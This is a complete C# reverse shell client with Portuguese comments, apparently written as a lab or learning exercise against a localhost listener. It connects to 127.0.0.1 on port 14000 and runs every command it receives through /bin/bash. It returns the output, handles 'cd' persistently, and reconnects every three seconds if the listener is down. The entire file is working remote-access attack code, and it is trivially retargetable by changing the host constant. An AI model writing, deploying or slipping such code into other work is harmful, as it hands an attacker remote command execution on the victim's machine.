using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

const string Host = "127.0.0.1";
const int Port = 14000;
const string EndMarker = "###END###";

string currentDir = Environment.CurrentDirectory;

while (true)
{
    try
    {
        using TcpClient client = new TcpClient(Host, Port);
        NetworkStream stream = client.GetStream();
        Console.WriteLine("Conectado ao listener.");

        byte[] buffer = new byte[1024];
        int bytesRead;

        while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
        {
            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();

            if (command == "exit")
                return;

            string output = ExecuteCommand(command) + EndMarker;
            byte[] outBytes = Encoding.UTF8.GetBytes(output);
            stream.Write(outBytes, 0, outBytes.Length);
        }
    }
    catch
    {
        Console.WriteLine("Listener offline. Tentando novamente em 3s...");
        Thread.Sleep(3000);
    }
}

string ExecuteCommand(string command)
{
    try
    {
        // cd precisa de tratamento especial cada comando roda
        // num processo novo, entao o cd nao "sobrevive" sozinho
        if (command.StartsWith("cd"))
        {
            string target = command.Length > 2
                ? command[2..].Trim()
                : Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            string fullPath = Path.IsPathRooted(target)
                ? target
                : Path.GetFullPath(Path.Combine(currentDir, target));

            if (Directory.Exists(fullPath))
            {
                currentDir = fullPath;
                return $"Diretório atual: {currentDir}\n";
            }

            return $"cd: {target}: diretório não encontrado\n";
        }

        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "/bin/bash",
            Arguments = $"-c \"{command.Replace("\"", "\\\"")}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            WorkingDirectory = currentDir
        };

        using Process? process = Process.Start(psi);
        if (process == null)
            return "[!] Falha ao iniciar o processo\n";

        string stdout = process.StandardOutput.ReadToEnd();
        string stderr = process.StandardError.ReadToEnd();
        process.WaitForExit();

        return stdout + stderr;
    }
    catch (Exception ex)
    {
        return $"[!] Erro: {ex.Message}\n";
    }
}